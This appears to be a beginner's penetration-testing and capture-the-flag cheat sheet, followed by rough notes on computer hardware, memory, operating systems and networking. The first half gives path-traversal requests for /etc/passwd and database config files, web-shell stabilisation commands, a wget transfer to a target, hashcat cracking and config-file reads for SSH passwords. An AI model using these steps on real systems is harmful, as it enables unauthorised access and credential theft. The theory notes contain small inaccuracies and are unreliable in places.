# Guide404
simple guide for noobs

----------------------GENERAL-----------------
(For every domain you find:)
1. nano /etc/hosts
(Harden the web shell)

2. python3 -c 'import pty; pty.spawn("/bin/bash")'   (SHELL HARDERING)
stty raw -echo; fg
export TERM=xterm
or
script /dev/null -c bash
stty raw -echo
fg
reset

3. (move one file from your machine to the target , if you have a ssh connection)
   --> python3 -m http.server 8888 (in the directory of yhe file you want to send)
   --> wget http://<myIP>:<port>/filename   (at target's pc)

--------------------LFI---------------------
1. (throught pdf export/download) (known exploitable files: https://github.com/hussein98d/LFI-files/blob/master/list.txt):
   --> (burpsuite) GET /download?filename=../../../../../etc/passwd HTTP/1.1
   --> GET /download?filename=../../config/database.yml HTTP/1.1

-----------------------------HASHES-----------------------------
1. go at hashcat id tables and ctr+F to searc your hash and take the id
2. hashcat -m <id> hash.txt /usr/share/wordlists/rockyou.txt

-----------------------------WEBSHELL-----------------------
(after you get a web shell)
1. python3 -c 'import pty; pty.spawn("/bin/bash")'
stty raw -echo; fg
export TERM=xterm
2. cat /var/www/limesurvey/application/config/config.php (you might find password for ssh)





                                                                                             SOME THEORY

A PC has those 5 components:
1)CPU     --> a) ALU (Arithmetic Logic Unit) does calculations   b) CU (Control unit) manage data/orders   c) Registers (short term storaging)  ||||| fetch->Decode->Excecute->Repeat
2)RAM     --> Fast temporary memory --> DDR4/DDR5
3)Hard Disk (ssd/hdd) or new gen (NVMe SSD)     -->SSD (faster,reliable,no noisy)   HDD (Bigger space than ssd, noisy and if it moves it can stop working)   
4)Motherboard
5)GPU
+ input/output devices (I/O)

inputs --> (CPU) processing --> (RAM/HardDisk) storage --> output


-----------------------------------------MEMORY-----------------------------------
overall memories --> a) Registers   b) Cashe (L1, fast but small|||L2,slow but bigger|||L3, even slower but bigger too)   c)RAM   d) HardDisk
when we open a program:
CPU loads it to the RAM from the HardDisk, and CPU reads it from the RAM and stores the data at Cache or Registers
If RAM is full, PC uses some space from HardDisk, like a Virtual Memory ----> Known us Paging (slower than RAM)


---------------------------------------OS--------------------------------
What it does?
1) CPU sheduling
2) RAM-VM sheduling
3) Storage management
4) I/O devices management
5) Files management

it has 4 parts:
1)Kernel: the core/brain of it, it communicates with the hardware and loads the programs at RAM.
2)Shell: the interface for the communication with the user
3)File System: the way the pc stores and manages the files (known ones: NTFS, FAT32, EXT4)
4)Drivers (softwares)

So when i open a PC, the 'Boot loader" loads the OS at RAM, the kernel starts the "start-ups" services and then every time you open a program: the OS loads it to the RAM, CPU execute the orders and the OS handle the data and communication user-program.

-------------------------------------Networking--------------------------------------
The base of nowadays networks are the Nodes and the Links
Types of networks: 
1) LAN
2) WAN
3) WLAN (wireless)
4) VPN
   The protocoles used are:
1)IP  (manages the addresses on the network)
2)TCP (slower but reliable)
3)UDP (fast but not so reliable)

The model that is commonly used is the OSI Model:
That has 7 layers:
7)Application          (HTTP,HTTPS,QUICK) apis
6)Presentation         cryptography
5)Session              manages connections/sessions
4)Transport            TCP/UDP
3)Network              IP
2)Data Link            Machine-Machine
1)Physical             wires/signals




